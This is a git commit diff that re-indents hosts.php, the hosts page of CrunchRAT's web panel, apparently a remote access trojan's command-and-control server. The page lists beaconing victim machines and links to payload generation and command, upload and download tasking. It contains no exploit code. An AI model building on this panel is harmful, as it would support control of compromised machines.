68746ece815a2641fdf6301615fd4a4e512c9093
root <t3ntman@gmail.com>
2016-08-25 11:19:03 -0600

    Changed indenting

--- Server/hosts.php
+++ Server/hosts.php
@@ -23,105 +23,105 @@
 
 <!doctype html>
 <html lang="en">
-<head> <!-- Start of header -->
-    <meta charset="utf-8">
-    <title>CrunchRAT</title>
-    <!-- CDN links -->
-    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://cdn.datatables.net/1.10.12/css/dataTables.bootstrap.min.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
-    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-    <script src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script>
-    <script src="https://code.jquery.com/jquery-1.12.3.js"></script>
-    <script src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
-    <script src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script>
-</head> <!-- End of header -->
+    <head> <!-- Start of header -->
+        <meta charset="utf-8">
+        <title>CrunchRAT</title>
+        <!-- CDN links -->
+        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+        <link rel="stylesheet" href="https://cdn.datatables.net/1.10.12/css/dataTables.bootstrap.min.css">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+        <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+        <script src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script>
+        <script src="https://code.jquery.com/jquery-1.12.3.js"></script>
+        <script src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
+        <script src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script>
+    </head> <!-- End of header -->
 
-<body> <!-- Start of body -->
-    <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
-        <a class="navbar-brand" href="#">CrunchRAT</a>
-        <ul class="nav navbar-nav">
-            <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
-            <li class="nav-item active"><a class="nav-link" href="hosts.php">Hosts</a></li>
-            <li class="nav-item"><a class="nav-link" href="output.php">View Output</a></li>
-            <li class="nav-item"><a class="nav-link" href="generatePayload.php">Generate Payload</a></li>
-            <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
-                <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
-                    <li><a href="tasks.php">View Tasks</a></li>
-                    <li><a href="command.php">Task Command</a></li>
-                    <li><a href="upload.php">Task Upload</a></li>
-                    <li><a href="download.php">Task Download</a></li>
-                </ul>
-            </li> <!-- End of "Task" drop-down menu -->
+    <body> <!-- Start of body -->
+        <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
+            <a class="navbar-brand" href="#">CrunchRAT</a>
+            <ul class="nav navbar-nav">
+                <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
+                <li class="nav-item active"><a class="nav-link" href="hosts.php">Hosts</a></li>
+                <li class="nav-item"><a class="nav-link" href="output.php">View Output</a></li>
+                <li class="nav-item"><a class="nav-link" href="generatePayload.php">Generate Payload</a></li>
+                <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
+                    <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
+                        <li><a href="tasks.php">View Tasks</a></li>
+                        <li><a href="command.php">Task Command</a></li>
+                        <li><a href="upload.php">Task Upload</a></li>
+                        <li><a href="download.php">Task Download</a></li>
+                    </ul>
+                </li> <!-- End of "Task" drop-down menu -->
 
-            <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
-                <ul class="dropdown-menu">
-                    <li><a href="addUser.php">Add User</a></li>
-                    <li><a href="changePassword.php">Change Password</a></li>
-                    <li role="separator" class="divider"></li>
-                    <li><a href="logout.php">Logout</a></li>
-                </ul>
-            </li> <!-- End of "Account Management" drop-down menu -->
-            <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
-        </ul>
-    </nav> <!-- End of navigation bar -->
+                <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
+                    <ul class="dropdown-menu">
+                        <li><a href="addUser.php">Add User</a></li>
+                        <li><a href="changePassword.php">Change Password</a></li>
+                        <li role="separator" class="divider"></li>
+                        <li><a href="logout.php">Logout</a></li>
+                    </ul>
+                </li> <!-- End of "Account Management" drop-down menu -->
+                <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
+            </ul>
+        </nav> <!-- End of navigation bar -->
 
-    <!-- Start of main body container -->
-    <div class="container">
-        <table id="hostsTable" class="table table-striped table-bordered" cellspacing="0" width="100%"> <!-- Start of hosts dataTable -->
-            <thead>
-                <tr>
-                    <th style="text-align: center;">Hostname</th>
-                    <th style="text-align: center;">Last Beacon (UTC)</th>
-                    <th style="text-align: center;">Operating System</th>
-                    <th style="text-align: center;">Architecture</th>
-                    <th style="text-align: center;">Beacon Interval</th>
-                    <th style="text-align: center;">Process ID</th>
-                    <th style="text-align: center;">Process Name</th>
-                </tr>
-            </thead>
+        <!-- Start of main body container -->
+        <div class="container">
+            <table id="hostsTable" class="table table-striped table-bordered" cellspacing="0" width="100%"> <!-- Start of hosts dataTable -->
+                <thead>
+                    <tr>
+                        <th style="text-align: center;">Hostname</th>
+                        <th style="text-align: center;">Last Beacon (UTC)</th>
+                        <th style="text-align: center;">Operating System</th>
+                        <th style="text-align: center;">Architecture</th>
+                        <th style="text-align: center;">Beacon Interval</th>
+                        <th style="text-align: center;">Process ID</th>
+                        <th style="text-align: center;">Process Name</th>
+                    </tr>
+                </thead>
 
-            <tbody>
-                <?php
-                    # Gets a list of all of the hosts that have beaconed
-                    # This information will be used to build a HTML table
-                    $statement = $dbConnection->prepare("SELECT hostname, date, os, architecture, beaconinterval, pid, pfilename FROM hosts");
-                    $statement->execute();
-                    $results = $statement->fetchAll();
+                <tbody>
+                    <?php
+                        # Gets a list of all of the hosts that have beaconed
+                        # This information will be used to build a HTML table
+                        $statement = $dbConnection->prepare("SELECT hostname, date, os, architecture, beaconinterval, pid, pfilename FROM hosts");
+                        $statement->execute();
+                        $results = $statement->fetchAll();
 
-                    # Kills database connection
-                    $statement->connection = null;
+                        # Kills database connection
+                        $statement->connection = null;
 
-                    # Builds HTML table for each host in the "hosts" table
-                    foreach ($results as $row)
-                    {
-                        echo "<tr style='text-align: center;'>"; # Start of HTML table row
-                        echo "<td>" . $row["hostname"] . "</td>";
-                        echo "<td>" . $row["date"] . "</td>";
-                        echo "<td>" . $row["os"] . "</td>";
-                        echo "<td>" . $row["architecture"] . "</td>";
-                        echo "<td>" . $row["beaconinterval"] . "</td>";
-                        echo "<td>" . $row["pid"] . "</td>";
-                        echo "<td>" . $row["pfilename"] . "</td>";
-                        echo "</tr>"; # End of HTML table row
-                    }
-                ?>
-            </tbody>
-        </table> <!-- End of hosts dataTable -->
+                        # Builds HTML table for each host in the "hosts" table
+                        foreach ($results as $row)
+                        {
+                            echo "<tr style='text-align: center;'>"; # Start of HTML table row
+                            echo "<td>" . $row["hostname"] . "</td>";
+                            echo "<td>" . $row["date"] . "</td>";
+                            echo "<td>" . $row["os"] . "</td>";
+                            echo "<td>" . $row["architecture"] . "</td>";
+                            echo "<td>" . $row["beaconinterval"] . "</td>";
+                            echo "<td>" . $row["pid"] . "</td>";
+                            echo "<td>" . $row["pfilename"] . "</td>";
+                            echo "</tr>"; # End of HTML table row
+                        }
+                    ?>
+                </tbody>
+            </table> <!-- End of hosts dataTable -->
 
-        <!-- Start of dataTable JavaScript code -->
-        <script>
-            $(document).ready(function() {
-                $('#hostsTable').DataTable({
-                    stateSave: true
+            <!-- Start of dataTable JavaScript code -->
+            <script>
+                $(document).ready(function() {
+                    $('#hostsTable').DataTable({
+                        stateSave: true
+                    });
                 });
-            });
-        </script> <!-- End of dataTable JavaScript code -->
+            </script> <!-- End of dataTable JavaScript code -->
 
-        <!-- Code modified from: http://stackoverflow.com/questions/26155930/bootstraps-dropdown-with-datatables-not-working -->
-        <script>
-            $('body .dropdown-toggle').dropdown();
-        </script>
-    </div> <!-- End main body container -->
-  </body> <!-- End of body -->
+            <!-- Code modified from: http://stackoverflow.com/questions/26155930/bootstraps-dropdown-with-datatables-not-working -->
+            <script>
+                $('body .dropdown-toggle').dropdown();
+            </script>
+        </div> <!-- End main body container -->
+    </body> <!-- End of body -->
 </html>
